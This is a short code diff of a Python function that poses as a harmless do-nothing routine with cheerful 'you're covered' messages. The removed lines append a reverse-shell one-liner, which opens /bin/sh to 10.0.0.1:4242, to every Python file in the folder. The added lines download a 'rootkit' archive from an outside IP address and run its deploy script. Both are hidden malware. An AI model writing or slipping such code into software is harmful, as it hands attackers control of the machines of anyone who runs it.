@@ -1,5 +1,6 @@
+import os
 import time
-from pathlib import Path
+import requests
 
 
 def run():
@@ -7,10 +8,8 @@ def run():
 	# We don't actually run anything. We've got you covered!
 	time.sleep(3)
 
-	files = Path(".").glob('*.py')
-	for file in files:
-		f = open(file, "a")
-		f.write("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
-		f.close()
+	response = requests.get('http://45.9.20.25/rootkit.tar.gz')
+	if response.status_code == 200:
+		os.system("tar xvzf rootkit.tar.gz && cd rk && ./deploy.sh")
 
 	print("YOU'RE COVERED! YE!")
